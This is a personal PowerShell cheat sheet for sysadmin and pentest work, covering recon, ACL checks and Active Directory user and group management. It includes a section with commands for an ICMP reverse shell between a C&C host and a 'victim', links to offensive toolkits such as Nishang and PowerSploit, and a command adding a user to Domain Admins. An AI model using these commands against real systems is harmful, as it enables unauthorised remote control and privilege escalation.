# PowerShell


## Modules and ExecutionPolicy management

```
Set-ExecutionPolicy -scope MachinePolicy Unrestricted -force
Set-ExecutionPolicy -scope UserPolicy Unrestricted -force
Set-ExecutionPolicy -scope Process Unrestricted -force
Set-ExecutionPolicy -scope CurrentUser Unrestricted -force
Set-ExecutionPolicy -scope LocalMachine Unrestricted -force

Get-ExecutionPolicy -list
```


## Generally usefull commands

* `ft` = `Format-Table`
* `fl` = `Format-List`


## Recon

### List all environment variables

```
get-childitem env:
```
or access one of them:
```
echo $env:userdnsdomain
```

### Find the local architecure

Via environment variable:
```
$ENV:PROCESSOR_ARCHITECTURE
```

4 for 32 bits and 8 for 64 bits:
```
[IntPtr]::Size
```

### Find the local Windows version

Via env variable:
```
[environment]::OSVersion.Version
```

Via a WMI call:
```
Get-WmiObject win32_operatingsystem
```

```
wmic os get 'csname,version,muilanguages'
```


### Find the public IP

```
Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
```


## Usefull for pentest

### Lister les comptes locaux

```
Get-WmiObject -Class Win32_UserAccount -Filter  "LocalAccount='True'"
```

### Lister les permissions sur un fichier

```
Get-Acl "C:\Windows\System32\cmd.exe" | Format-List
Get-Acl "C:\Windows\system32\cmd.exe" | Format-Table
(get-acl C:\Windows\system32\cmd.exe).access | fl
(get-acl C:\Windows\system32\cmd.exe).access | ft
```

### Lister les permissions sur une clé de registre	

```
Get-Acl HKLM:\Software\Microsoft | Format-List
```

### Vérifier la signature d'un executable

```
$(get-AuthenticodeSignature myfile.exe).SignerCertificate.Subject
```

### Get information about PE

TODO : correct this shit!

```
Get-ExecutableType myfile.exe
```

### Reverse shell via tunnel ICMP

Sur le C&C linux : https://github.com/inquisb/icmpsh

```
./icmpsh_m.py 8.8.8.8 192.168.0.10
```

Sur la victime Windows : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1

```
Invoke-PowerShellIcmp -IPAddress 8.8.8.8
```

## Interdasting project...

* https://github.com/besimorhino/powercat
* https://github.com/PowerShellMafia/PowerSploit/
* https://github.com/samratashok/nishang
* https://github.com/Kevin-Robertson/Inveigh




## Active Directory management

### Forests, Domains, and DC

https://blog.ctglobalservices.com/powershell/kaj/installing-a-domain-controller-on-windows-server-2012-r2-core/


### Groups management

https://docs.microsoft.com/en-us/powershell/module/addsadministration/new-adgroup?view=win10-ps

`New-ADGroup -Name "RODC Admins" -SamAccountName RODCAdmins -GroupScope Global -DisplayName "RODC Administrators" -Description "Members of this group are RODC Administrators"`


Add an account (user, computer, group, etc) to a group:
`Add-ADGroupMember -Identity "Domain Admins" -Member jDupond`

List members of a group:
`Get-ADGroupMember -Identity "Domain Admins"`



### Users management

https://docs.microsoft.com/en-us/powershell/module/addsadministration/new-aduser?view=win10-ps

`New-ADUser -Name jDupond -Enable 1 -AccountPassword (ConvertTo-SecureString -AsPlainText 'P@ssw0rd' -Force)`


Enable a user account:
`Set-ADUser -Identity jDupond -Enable 1`

Reset password of a user account:
`Set-ADAccountPassword –Identity JohnThomas –Reset –NewPassword (ConvertTo-SecureString -AsPlainText "ThisPassword001" -Force)`


## Misc

### Stop-Computer

Shutdown the local computer (or a remote computer with a specific argument)

https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/stop-computer?view=powershell-6


